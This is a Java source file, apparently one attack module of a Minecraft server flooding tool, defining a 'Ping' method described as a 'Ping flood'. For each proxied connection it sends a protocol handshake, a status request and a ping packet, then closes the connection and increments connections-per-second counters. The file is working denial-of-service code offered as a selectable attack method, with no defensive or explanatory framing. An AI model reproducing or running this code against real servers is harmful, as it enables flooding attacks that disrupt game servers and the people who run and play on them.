package dev.lastknell.core.methods.impl;

import dev.lastknell.core.NettyBootstrap;
import dev.lastknell.core.methods.IMethod;
import dev.lastknell.core.packets.Handshake;
import dev.lastknell.core.packets.PingPacket;
import dev.lastknell.core.proxy.Proxy;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Ping implements IMethod {

    private NettyBootstrap service;
    private byte[] handshake;

    @Override
    public void accept(Channel channel, Proxy proxy) {
        service.oppnedCPS++;
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
        channel.writeAndFlush(Unpooled.buffer().writeBytes(new byte[] { 1, 0 }));
        channel.writeAndFlush(
                Unpooled.buffer().writeBytes(
                        PingPacket.getWrappedPacket(System.currentTimeMillis())));
        channel.close();
        service.successfulCPS++;
    }

    @Override
    public void init(NettyBootstrap service) {
        this.service = service;
        handshake = Handshake.getWrappedPacket(service.protocolID, service.srvIp, service.port, 2);
    }

    @Override
    public String getName() {
        return "Ping";
    }

    @Override
    public String getDesc() {
        return "Ping flood";
    }

    @Override
    public boolean isExperimental() {
        return false;
    }

}
